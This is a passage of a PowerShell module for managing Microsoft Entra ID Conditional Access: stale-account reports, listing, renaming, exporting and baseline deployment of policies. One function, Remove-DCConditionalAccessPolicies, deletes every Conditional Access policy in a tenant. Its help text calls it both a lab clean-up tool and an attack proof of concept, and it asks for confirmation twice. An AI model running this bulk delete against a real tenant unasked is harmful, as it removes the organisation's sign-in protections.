                if ($Groups.count -gt 1) {
                    "$($Group.displayName)"
                } else {
                    "$($Group.displayName; )"
                }
            }
        }


        # Filter and format stale accounts.
        if ($null -eq $LastSignInActivity -or (Get-Date -Date $LastSignInActivity) -lt ((Get-Date -Date (Get-Date -Format 'yyyy-MM-dd')).AddDays(-$LastSeenDaysAgo))) {
            $CustomObject = New-Object -TypeName psobject

            $CustomObject | Add-Member -MemberType NoteProperty -Name "LastSignInActivity" -Value $LastSignInActivity

            $CustomObject | Add-Member -MemberType NoteProperty -Name "DisplayName" -Value $User.DisplayName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "userPrincipalName" -Value $User.userPrincipalName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "userType" -Value $User.userType
            $CustomObject | Add-Member -MemberType NoteProperty -Name "accountEnabled" -Value $User.accountEnabled
            $CustomObject | Add-Member -MemberType NoteProperty -Name "onPremisesSyncEnabled" -Value $User.onPremisesSyncEnabled

            if ($User.assignedLicenses.skuId) {
                $CustomObject | Add-Member -MemberType NoteProperty -Name "assignedLicenses" -Value $true
            } else {
                $CustomObject | Add-Member -MemberType NoteProperty -Name "assignedLicenses" -Value $false
            }

            $CustomObject | Add-Member -MemberType NoteProperty -Name "companyName" -Value $User.companyName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "department" -Value $User.department
            $CustomObject | Add-Member -MemberType NoteProperty -Name "country" -Value $User.country

            if ($IncludeMemberOf) {
                $CustomObject | Add-Member -MemberType NoteProperty -Name "GroupMembership" -Value $MemberOf.ToString()
            }

            $CustomObject | Add-Member -MemberType NoteProperty -Name "id" -Value $User.id

            $CustomObject
        }
    }

    $Result2 = $Result2 | Sort-Object LastSignInActivity

    Write-Verbose -Verbose -Message "Found $($Result2.Count) stale user accounts in Entra ID."


    # Export the report to Excel.
    Write-Verbose -Verbose -Message "Exporting report to Excel..."
    $Path = "$((Get-Location).Path)\Stale Accounts $(Get-Date -Format 'yyyy-MM-dd').xlsx"
    $Result2 | Export-Excel -Path $Path -WorksheetName "Stale Accounts" -BoldTopRow -FreezeTopRow -AutoFilter -AutoSize -ClearSheet -Show


    Write-Verbose -Verbose -Message "Saved $Path"
    Write-Verbose -Verbose -Message "Done!"
}



function Get-DCConditionalAccessPolicies {
    <#
        .SYNOPSIS
            List all Conditional Access policies in the tenant.

        .DESCRIPTION
            List all Conditional Access policies in the tenant.

            You can filter on a name prefix with -PrefixFilter.
            
        .PARAMETER PrefixFilter
            Only show the policies with this prefix.

        .PARAMETER ShowTargetResources
            Show included and excluded resources in output. Only relevant without -Details.

        .PARAMETER Details
            Include policy details in output.

        .PARAMETER NamesOnly
            Show names only in output.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Get-DCConditionalAccessPolicies

        .EXAMPLE
            Get-DCConditionalAccessPolicies -PrefixFilter 'GLOBAL - '
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$PrefixFilter = '',

        [parameter(Mandatory = $false)]
        [switch]$ShowTargetResources,

        [parameter(Mandatory = $false)]
        [switch]$Details,

        [parameter(Mandatory = $false)]
        [switch]$NamesOnly
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose
    

    # Get all existing policies.
    $ExistingPolicies = Get-MgIdentityConditionalAccessPolicy

    Write-Verbose -Verbose -Message "Fetching Conditional Access policies..."

    if ($Details) {
        $Result = foreach ($Policy in $ExistingPolicies) {
            if ($Policy.DisplayName.StartsWith($PrefixFilter)) {
                $CustomObject = New-Object -TypeName psobject
                $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value $Policy.DisplayName
                $CustomObject | Add-Member -MemberType NoteProperty -Name "State" -Value $Policy.State
                $CustomObject | Add-Member -MemberType NoteProperty -Name "CreatedDateTime" -Value $Policy.CreatedDateTime
                $CustomObject | Add-Member -MemberType NoteProperty -Name "ModifiedDateTime" -Value $Policy.ModifiedDateTime
                $CustomObject | Add-Member -MemberType NoteProperty -Name "Conditions" -Value ($Policy.Conditions | ConvertTo-Json)
                $CustomObject | Add-Member -MemberType NoteProperty -Name "GrantControls" -Value ($Policy.GrantControls | ConvertTo-Json)
                $CustomObject | Add-Member -MemberType NoteProperty -Name "SessionControls" -Value ($Policy.SessionControls | ConvertTo-Json)
                $CustomObject
            }
        }

        $Result | Format-List
    } elseif ($NamesOnly) {
        $Result = foreach ($Policy in $ExistingPolicies) {
            if ($Policy.DisplayName.StartsWith($PrefixFilter)) {
                $CustomObject = New-Object -TypeName psobject
                $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value $Policy.DisplayName
                $CustomObject
            }
        }

        $Result
    } else {
        $Result = foreach ($Policy in $ExistingPolicies) {
            if ($Policy.DisplayName.StartsWith($PrefixFilter)) {
                $CustomObject = New-Object -TypeName psobject
                $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value $Policy.DisplayName
                $CustomObject | Add-Member -MemberType NoteProperty -Name "State" -Value $Policy.State
                $CustomObject | Add-Member -MemberType NoteProperty -Name "CreatedDateTime" -Value $Policy.CreatedDateTime
                $CustomObject | Add-Member -MemberType NoteProperty -Name "ModifiedDateTime" -Value $Policy.ModifiedDateTime

                if ($ShowTargetResources) {
                    $CustomObject | Add-Member -MemberType NoteProperty -Name "TargetResources" -Value ($Policy.Conditions.Users | ConvertTo-Json -Depth 5)
                }

                $CustomObject
            }
        }


        if ($ShowTargetResources) {
            $Result | Format-List
        } else {
            $Result | Format-Table
        }
    }
    

    Write-Verbose -Verbose -Message "Done!"
}



function Remove-DCConditionalAccessPolicies {
    <#
        .SYNOPSIS
            Delete ALL Conditional Access policies in a tenant.

        .DESCRIPTION
            This script is a proof of concept and for testing purposes only. Do not use this script in an unethical or unlawful way. Don’t be stupid!

            This CMDlet uses Microsoft Graph to automatically delete all Conditional Access policies in a tenant. It was primarily created to clean-up lab tenants, and as an attack PoC.
            
            This CMDlet will prompt you for confirmation multiple times before deleting policies.
            
        .PARAMETER PrefixFilter
            Only delete the policies with this prefix.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Remove-DCConditionalAccessPolicies

        .EXAMPLE
            Remove-DCConditionalAccessPolicies -PrefixFilter 'TEST - '
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$PrefixFilter = ''
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.Read.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose


    # Prompt for confirmation:
    if ($PrefixFilter -ne '') {
        $title    = 'Confirm'
        $question = "Do you want to remove all Conditional Access policies with prefix '$PrefixFilter' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'? WARNING: ALL THESE POLICIES WILL BE DELETED!!"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    } else {
        $title    = 'Confirm'
        $question = "Do you want to remove all Conditional Access policies in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'? WARNING: ALL POLICIES WILL BE DELETED!!"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    }
    

    # Prompt for confirmation:
    $title    = 'Confirm'
    $question = "ARE YOU REALLY REALLY SURE?"
    $choices  = '&Yes', '&No'

    $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
    if ($decision -eq 0) {
        Write-Host ""
        Write-Verbose -Verbose -Message "Starting deletion..."
    } else {
        return
    }


    # Delete all existing policies.
    $ExistingPolicies = Get-MgIdentityConditionalAccessPolicy


    foreach ($Policy in $ExistingPolicies) {
        if ($Policy.DisplayName.StartsWith($PrefixFilter)) {
            Start-Sleep -Seconds 1
            Write-Verbose -Verbose -Message "Deleting '$($Policy.DisplayName)'..."
            $GraphUri = "https://graph.microsoft.com/beta/identity/conditionalAccess/policies/$($Policy.Id)"

            Invoke-MgGraphRequest -Method 'DELETE' -Uri $GraphUri -ErrorAction SilentlyContinue | Out-Null
        }
    }


    Write-Verbose -Verbose -Message "Done!"
}



function Rename-DCConditionalAccessPolicies {
    <#
        .SYNOPSIS
            Rename Conditional Access policies that matches a specific prefix.

        .DESCRIPTION
            This command helps you to quickly rename a bunch of Conditional Access policies by searching for a specific prefix.

            If you dontt specify a PrefixFilter, ALL policies will be modified to include the new prefix .
            
        .PARAMETER PrefixFilter
            Only toggle the policies with this prefix.

        .PARAMETER AddCustomPrefix
            Adds a custom prefix to all policy names.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Rename-DCConditionalAccessPolicies -PrefixFilter 'PILOT - ' -AddCustomPrefix 'PROD - '

        .EXAMPLE
            Rename-DCConditionalAccessPolicies -PrefixFilter 'GLOBAL - ' -AddCustomPrefix 'REPORT - GLOBAL - '

        .EXAMPLE
            Rename-DCConditionalAccessPolicies -AddCustomPrefix 'OLD - '
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$PrefixFilter = '',

        [parameter(Mandatory = $true)]
        [string]$AddCustomPrefix
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose


    if ($PrefixFilter -eq '') {
        # Prompt for confirmation:
        $title    = 'Confirm'
        $question = "Do you want to add prefix '$AddCustomPrefix' to ALL Conditional Access policies in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    } else {
        # Prompt for confirmation:
        $title    = 'Confirm'
        $question = "Do you want to rename all Conditional Access policies with prefix '$PrefixFilter' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )' to '$AddCustomPrefix'?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    }
    

    # Modify all existing policies.
    Write-Verbose -Verbose -Message "Looking for Conditional Access policies to rename..."
    $ExistingPolicies = Get-MgIdentityConditionalAccessPolicy


    foreach ($Policy in $ExistingPolicies) {
        if ($Policy.DisplayName.StartsWith($PrefixFilter)) {

            if ($PrefixFilter -eq '') {
                Write-Verbose -Verbose -Message "Adding prefix '$AddCustomPrefix' to policy '$($Policy.DisplayName)'..."

                # Rename policy:
                $params = @{
                    DisplayName = "$AddCustomPrefix$($Policy.DisplayName)"
                }
                
                Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $Policy.Id -BodyParameter $params

                Start-Sleep -Seconds 1
            } else {
                Write-Verbose -Verbose -Message "Renaming '$($Policy.DisplayName)' to '$($Policy.DisplayName -replace $PrefixFilter, $AddCustomPrefix)'..."

                # Rename policy:
                $params = @{
                    DisplayName = "$($Policy.DisplayName -replace $PrefixFilter, $AddCustomPrefix)"
                }
                
                Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $Policy.Id -BodyParameter $params

                Start-Sleep -Seconds 1
            }
        }
    }


    Write-Verbose -Verbose -Message "Done!"
}


function Get-DCNamedLocations {
    <#
        .SYNOPSIS
            List Named Locations in the tenant.

        .DESCRIPTION
            List Named Locations in the tenant.

            You can filter on a name prefix with -PrefixFilter.
            
        .PARAMETER PrefixFilter
            Only show the named locations with this prefix.

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Get-DCNamedLocations

        .EXAMPLE
            Get-DCNamedLocations -PrefixFilter 'OFFICE-'

        .EXAMPLE
            # List all trusted IP addresses.
            (Get-DCNamedLocations | where isTrusted -eq $true).ipRanges | Select-Object -Unique | Sort-Object

        .EXAMPLE
            # List all countries.
            (Get-DCNamedLocations).countriesAndRegions | Select-Object -Unique | Sort-Object
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$PrefixFilter = ''
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.Read.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose
    

    # Get all named locations.
    $NamedLocations = Get-MgIdentityConditionalAccessNamedLocation

    Write-Verbose -Verbose -Message "Fetching Named Locations..."

    $Result = foreach ($NamedLocation in $NamedLocations) {
        if ($NamedLocation.DisplayName.StartsWith($PrefixFilter)) {
            $CustomObject = New-Object -TypeName psobject
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value $NamedLocation.DisplayName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value $NamedLocation.Id
            $CustomObject | Add-Member -MemberType NoteProperty -Name "CreatedDateTime" -Value $NamedLocation.CreatedDateTime
            $CustomObject | Add-Member -MemberType NoteProperty -Name "ModifiedDateTime" -Value $NamedLocation.ModifiedDateTime
            $CustomObject | Add-Member -MemberType NoteProperty -Name "isTrusted" -Value $NamedLocation.AdditionalProperties.isTrusted
            $CustomObject | Add-Member -MemberType NoteProperty -Name "ipRanges" -Value $NamedLocation.AdditionalProperties.ipRanges.cidrAddress
            $CustomObject | Add-Member -MemberType NoteProperty -Name "countriesAndRegions" -Value $NamedLocation.AdditionalProperties.countriesAndRegions
            $CustomObject | Add-Member -MemberType NoteProperty -Name "countryLookupMethod" -Value $NamedLocation.AdditionalProperties.countryLookupMethod
            $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUnknownCountriesAndRegions" -Value $NamedLocation.AdditionalProperties.includeUnknownCountriesAndRegions
            $CustomObject
        }
    }

    $Result
    

    Write-Verbose -Verbose -Message "Done!"
}



function Deploy-DCConditionalAccessBaselinePoC {
    <#
        .SYNOPSIS
            Automatically deploy the latest version of the Conditional Access policy design baseline from https://danielchronlund.com.

        .DESCRIPTION
            This CMDlet downloads the latest version of the Conditional Access policy design baseline from https://danielchronlund.com/2020/11/26/azure-ad-conditional-access-policy-design-baseline-with-automatic-deployment-support/. It creates all necessary dependencies like exclusion groups, named locations, and terms of use, and then deploys all Conditional Access policies in the baseline.

            All Conditional Access policies created by this CMDlet will be set to report-only mode.

            The purpose of this tool is to quickly deploy the complete baseline as a PoC. You can then test, pilot, and deploy it going forward.

            You must be a Global Admin to run this command (because of the admin consent required) but no other preparations are required.
            
        .PARAMETER AddCustomPrefix
            Adds a custom prefix to all policy names.

        .PARAMETER ExcludeGroupDisplayName
            Set a custom name for the break glass exclude group. Default: 'Excluded from Conditional Access'. You can set this to an existing group if you already have one.

        .PARAMETER ServiceAccountGroupDisplayName
            Set a custom name for the service account group. Default: 'Conditional Access Service Accounts'. You can set this to an existing group if you already have one.

        .PARAMETER NamedLocationCorpNetwork
            Set a custom name for the corporate network named location. Default: 'Corporate Network'. You can set this to an existing named location if you already have one.

        .PARAMETER NamedLocationAllowedCountries
            Set a custom name for the allowed countries named location. Default: 'Allowed Countries'. You can set this to an existing named location if you already have one.

        .PARAMETER TermsOfUseName
            Set a custom name for the terms of use. Default: 'Terms of Use'. You can set this to an existing Terms of Use if you already have one.

        .PARAMETER SkipPolicies
            Specify one or more policy names in the baseline that you want to skip.

        .PARAMETER SkipReportOnlyMode
            All Conditional Access policies created by this CMDlet will be set to report-only mode if you don't use this parameter. WARNING: Use this parameter with caution since ALL POLICIES will go live for ALL USERS when you specify this.

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Deploy-DCConditionalAccessBaselinePoC

        .EXAMPLE
            Deploy-DCConditionalAccessBaselinePoC -AddCustomPrefix 'PILOT - '

        .EXAMPLE
            # Customize names of dependencies.
            $Parameters = @{
                ExcludeGroupDisplayName = 'Excluded from Conditional Access'
                ServiceAccountGroupDisplayName = 'Conditional Access Service Accounts'
                NamedLocationCorpNetwork = 'Corporate Network'
                NamedLocationAllowedCountries = 'Allowed Countries'
                TermsOfUseName = 'Terms of Use'
            }

            Deploy-DCConditionalAccessBaselinePoC @Parameters

        .EXAMPLE
            Deploy-DCConditionalAccessBaselinePoC -SkipPolicies "GLOBAL - BLOCK - High-Risk Sign-Ins", "GLOBAL - BLOCK - High-Risk Users", "GLOBAL - GRANT - Medium-Risk Sign-Ins", "GLOBAL - GRANT - Medium-Risk Users"

        .EXAMPLE
            Deploy-DCConditionalAccessBaselinePoC -SkipReportOnlyMode # WARNING: USE WITH CAUTION!
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$AddCustomPrefix = '',

        [parameter(Mandatory = $false)]
        [string]$ExcludeGroupDisplayName = 'Excluded from Conditional Access',

        [parameter(Mandatory = $false)]
        [string]$ServiceAccountGroupDisplayName = 'Conditional Access Service Accounts',

        [parameter(Mandatory = $false)]
        [string]$NamedLocationCorpNetwork = 'Corporate Network',

        [parameter(Mandatory = $false)]
        [string]$NamedLocationAllowedCountries = 'Allowed Countries',

        [parameter(Mandatory = $false)]
        [string]$TermsOfUseName = 'Terms of Use',

        [parameter(Mandatory = $false)]
        [string[]]$SkipPolicies,

        [parameter(Mandatory = $false)]
        [switch]$SkipReportOnlyMode
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Group.ReadWrite.All', 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All', 'Agreement.ReadWrite.All', 'Application.Read.All', 'RoleManagement.ReadWrite.Directory' -Verbose
    

    # Prompt for confirmation:
    if ($SkipReportOnlyMode) {
        $title    = 'Confirm'
        $question = "Do you want to deploy the Conditional Access baseline PoC (production mode) in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'? WARNING: ALL POLICIES will go live for ALL USERS! Remove -SkipReportOnlyMode to deploy in report-only mode instead."
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
            Write-Verbose -Verbose -Message "Starting deployment..."
        } else {
            return
        }
    } else {
        $title    = 'Confirm'
        $question = "Do you want to deploy the Conditional Access baseline PoC (report-only) in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 0)
        if ($decision -eq 0) {
            Write-Host ""
            Write-Verbose -Verbose -Message "Starting deployment..."
        } else {
            return
        }
    }
    


    # Step 2: Manage Conditional Access exclude group for break glass accounts.

    # Check for existing group.
    Write-Verbose -Verbose -Message "Checking for existing exclude group '$ExcludeGroupDisplayName'..."
    $ExistingExcludeGroup = Get-MgGroup -Filter "DisplayName eq '$ExcludeGroupDisplayName'" -Top 1

    if ($ExistingExcludeGroup) {
        Write-Verbose -Verbose -Message "The group '$ExcludeGroupDisplayName' already exists!"
    } else {
        # Create group if none existed.
        Write-Verbose -Verbose -Message "Could not find '$ExcludeGroupDisplayName'. Creating group..."
        $ExistingExcludeGroup = New-MgGroup -DisplayName $ExcludeGroupDisplayName -MailNickName $($ExcludeGroupDisplayName.Replace(' ', '_')) -MailEnabled:$False -SecurityEnable -IsAssignableToRole

        # Sleep for 5 seconds.
        Start-Sleep -Seconds 5

        # Add current user to the new exclude group.
        $CurrentUser = Get-MgUser -Filter "UserPrincipalName eq '$((Get-MgContext).Account)'"
        Write-Verbose -Verbose -Message "Adding current user '$($CurrentUser.UserPrincipalName)' to the new group..."
        New-MgGroupMember -GroupId $ExistingExcludeGroup.Id -DirectoryObjectId $CurrentUser.Id
    }


    # Step 3: Manage Conditional Access service account group (for non-human accounts).

    # Check for existing group.
    Write-Verbose -Verbose -Message "Checking for existing service account group '$ServiceAccountGroupDisplayName'..."
    $ExistingServiceAccountGroup = Get-MgGroup -Filter "DisplayName eq '$ServiceAccountGroupDisplayName'" -Top 1

    if ($ExistingServiceAccountGroup) {
        Write-Verbose -Verbose -Message "The group '$ServiceAccountGroupDisplayName' already exists!"
    } else {
        # Create group if none existed.
        Write-Verbose -Verbose -Message "Could not find '$ServiceAccountGroupDisplayName'. Creating group..."
        $ExistingServiceAccountGroup = New-MgGroup -DisplayName $ServiceAccountGroupDisplayName -MailNickName $($ServiceAccountGroupDisplayName.Replace(' ', '_')) -MailEnabled:$False -SecurityEnable -IsAssignableToRole
    }


    # Step 4: Manage named location for corporate network trusted IP addresses.

    # Check for existing named location.
    Write-Verbose -Verbose -Message "Checking for existing corporate network named location '$NamedLocationCorpNetwork'..."
    $ExistingCorpNetworkNamedLocation = Get-MgIdentityConditionalAccessNamedLocation -Filter "DisplayName eq '$NamedLocationCorpNetwork'" -Top 1

    if ($ExistingCorpNetworkNamedLocation) {
        Write-Verbose -Verbose -Message "The named location '$NamedLocationCorpNetwork' already exists!"
    } else {
        # Create named location if none existed.
        Write-Verbose -Verbose -Message "Could not find '$NamedLocationCorpNetwork'. Creating named location..."

        # Get current public IP address:
        $PublicIp = (Get-DCPublicIp).ip

        $params = @{
        "@odata.type" = "#microsoft.graph.ipNamedLocation"
        DisplayName = "$NamedLocationCorpNetwork"
        IsTrusted = $true
        IpRanges = @(
            @{
                "@odata.type" = "#microsoft.graph.iPv4CidrRange"
                CidrAddress = "$PublicIp/32"
            }
        )
        }

        $ExistingCorpNetworkNamedLocation = New-MgIdentityConditionalAccessNamedLocation -BodyParameter $params
    }


    # Step 5: Manage named location for allowed countries.

    # Check for existing named location.
    Write-Verbose -Verbose -Message "Checking for existing allowed countries named location '$NamedLocationAllowedCountries'..."
    $ExistingNamedLocationAllowedCountries = Get-MgIdentityConditionalAccessNamedLocation -Filter "DisplayName eq '$NamedLocationAllowedCountries'" -Top 1

    if ($ExistingNamedLocationAllowedCountries) {
        Write-Verbose -Verbose -Message "The named location '$NamedLocationAllowedCountries' already exists!"
    } else {
        # Create named location if none existed.
        Write-Verbose -Verbose -Message "Could not find '$NamedLocationAllowedCountries'. Creating named location..."

        $params = @{
            "@odata.type" = "#microsoft.graph.countryNamedLocation"
            DisplayName = "$NamedLocationAllowedCountries"
            CountriesAndRegions = @(
                "SE"
                "US"
            )
            IncludeUnknownCountriesAndRegions = $true
        }
        
        $ExistingNamedLocationAllowedCountries = New-MgIdentityConditionalAccessNamedLocation -BodyParameter $params
    }


    # Step 6: Manage Terms of Use.

    # Check for existing Terms of Use.
    if ($SkipPolicies -eq 'GLOBAL - GRANT - Terms of Use') {
        Write-Verbose -Verbose -Message "Skipping Terms of Use because -SkipPolicies was set!"
    } else {
        Write-Verbose -Verbose -Message "Checking for existing Terms of Use '$TermsOfUseName'..."
        $ExistingTermsOfUse = Get-MgAgreement | where DisplayName -eq $TermsOfUseName | Select-Object -Last 1

        if ($ExistingTermsOfUse) {
            Write-Verbose -Verbose -Message "The Terms of Use '$TermsOfUseName' already exists!"
        } else {
            # Create Terms of Use if none existed.
            Write-Verbose -Verbose -Message "Could not find '$TermsOfUseName'. Creating Terms of Use..."

            # Download Terms of Use template from https://danielchronlund.com.
            Write-Verbose -Verbose -Message "Downloading Terms of Use template from https://danielchronlund.com..."
            Invoke-WebRequest 'https://danielchronlundcloudtechblog.files.wordpress.com/2023/09/termsofuse.pdf' -OutFile 'termsofuse.pdf'

            $fileContent = get-content -Raw 'termsofuse.pdf'
            $fileContentBytes = [System.Text.Encoding]::Default.GetBytes($fileContent)
            $fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)

            $GraphBody = @"
{
    "displayName": "Terms of Use",
    "isViewingBeforeAcceptanceRequired": true,
    "files": [
        {
        "fileName": "termsofuse.pdf",
        "language": "en",
        "isDefault": true,
        "fileData": {
            "data": "$fileContentEncoded"
        }
        }
    ]
}
"@

            Write-Verbose -Verbose -Message "Uploading template to Entra ID..."

            $ExistingTermsOfUse = Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/v1.0/identityGovernance/termsOfUse/agreements' -Body $GraphBody
        }
    }


    # Step 7: Download Conditional Access baseline in JSON format from https://danielchronlund.com.

    Write-Verbose -Verbose -Message "Downloading Conditional Access baseline template from https://danielchronlund.com..."
    Invoke-WebRequest 'https://danielchronlundcloudtechblog.files.wordpress.com/2023/09/conditional-access-design-version-13-poc.zip' -OutFile 'conditional-access-design-version-13-poc.zip'

    Write-Verbose -Verbose -Message "Unziping template..."
    Expand-Archive -LiteralPath 'conditional-access-design-version-13-poc.zip' -DestinationPath . -Force


    # Step 8: Modify JSON content.

    $JSONContent = Get-Content -Raw -Path 'Conditional Access Design version 13 PoC.json'

    # Report-only mode.
    if (!($SkipReportOnlyMode)) {
        $JSONContent = $JSONContent -replace '"enabled"', '"enabledForReportingButNotEnforced"'
    } else {
        $JSONContent = $JSONContent -replace '"disabled"', '"enabled"'
    }

    $JSONContent = $JSONContent -replace 'GLOBAL - ', "$AddCustomPrefix`GLOBAL - "
    $JSONContent = $JSONContent -replace 'CUSTOM - ', "$AddCustomPrefix`CUSTOM - "
    $JSONContent = $JSONContent -replace 'REPLACE WITH EXCLUDE GROUP ID', $ExistingExcludeGroup.Id
    $JSONContent = $JSONContent -replace 'REPLACE WITH SERVICE ACCOUNT GROUP ID', $ExistingServiceAccountGroup.Id
    $JSONContent = $JSONContent -replace 'REPLACE WITH SERVICE ACCOUNT TRUSTED NAMED LOCATION ID', $ExistingCorpNetworkNamedLocation.Id
    $JSONContent = $JSONContent -replace 'REPLACE WITH ALLOWED COUNTRIES NAMED LOCATION ID', $ExistingNamedLocationAllowedCountries.Id
    $JSONContent = $JSONContent -replace 'REPLACE WITH TERMS OF USE ID', $ExistingTermsOfUse.Id
 

    # Step 9: Deploy Conditional Access baseline.

    Write-Verbose -Verbose -Message "Deploying Conditional Access policies..."

    $ConditionalAccessPolicies = $JSONContent | ConvertFrom-Json

    foreach ($Policy in $ConditionalAccessPolicies) {
        if ($SkipPolicies -contains $Policy.DisplayName) {
            Write-Verbose -Verbose -Message "Skipping '$($Policy.DisplayName)'!"
        } else {
            Start-Sleep -Seconds 1
            Write-Verbose -Verbose -Message "Creating '$($Policy.DisplayName)'..."

            try {
                # Create new policies.
                Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies' -Body ($Policy | ConvertTo-Json -Depth 10) | Out-Null
            }
            catch {
                Write-Error -Message $_.Exception.Message -ErrorAction Continue
            }
        }
    }


    # Step 10: Clean-up.

    Write-Verbose -Verbose -Message "Performing clean-up..."

    Remove-Item 'Conditional Access Design version 13 PoC.json' -Force -ErrorAction SilentlyContinue
    Remove-Item 'conditional-access-design-version-13-poc.zip' -Force -ErrorAction SilentlyContinue
    Remove-Item 'termsofuse.pdf' -Force -ErrorAction SilentlyContinue


    Write-Verbose -Verbose -Message "Done!"
}



function Export-DCConditionalAccessPolicyDesign {
    <#
        .SYNOPSIS
            Export all Conditional Access policies to JSON.

        .DESCRIPTION
            This CMDlet uses Microsoft Graph to export all Conditional Access policies in the tenant to a JSON file. This JSON file can be used for backup, documentation or to deploy the same policies again with Import-DCConditionalAccessPolicyDesign. You can basically treat Conditional Access as code!

            The user running this CMDlet (the one who signs in when the authentication pops up) must have the appropriate permissions in Entra ID (Global Admin, Security Admin, Conditional Access Admin, etc).

        .PARAMETER FilePath
            The file path where the new JSON file will be created. Skip this to use the current path.

        .PARAMETER PrefixFilter
            Only export the policies with this prefix.

        .INPUTS
            None

        .OUTPUTS
            JSON file with all Conditional Access policies.

        .NOTES
            Author:   Daniel Chronlund
